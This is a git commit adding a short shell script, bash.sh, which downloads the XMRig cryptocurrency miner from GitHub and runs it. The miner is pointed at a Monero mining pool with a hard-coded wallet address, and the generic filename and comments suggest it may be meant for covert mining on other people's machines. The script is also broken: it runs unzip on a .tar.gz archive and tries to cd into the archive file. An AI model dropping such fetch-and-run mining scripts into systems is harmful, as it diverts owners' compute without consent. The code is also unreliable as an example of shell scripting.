b8ca263a83c2ac50a91a924fc626609ec3fd7a81
Daisy <71977928+anhbtit80@users.noreply.github.com>
2025-03-06 22:45:27 +0700

    Create bash.sh

---
+++ bash.sh
@@ -0,0 +1,11 @@
+#download essential files
+wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+
+#unzip
+unzip xmrig-6.22.2-linux-static-x64.tar.gz
+
+#cd
+cd xmrig-6.22.2-linux-static-x64.tar.gz
+
+#run the code
+./xmrig -o pool.hashvault.pro:443 -u 458wDBqXmANaEQRqEeBEU474xigR2u6gkchgPMxeQMtFJTjpdhfFKTA2GZV3VCSTW2ieU8hTSnnwQ2rz1arMjXm231CL8CL -k --coin monero -a rx/0
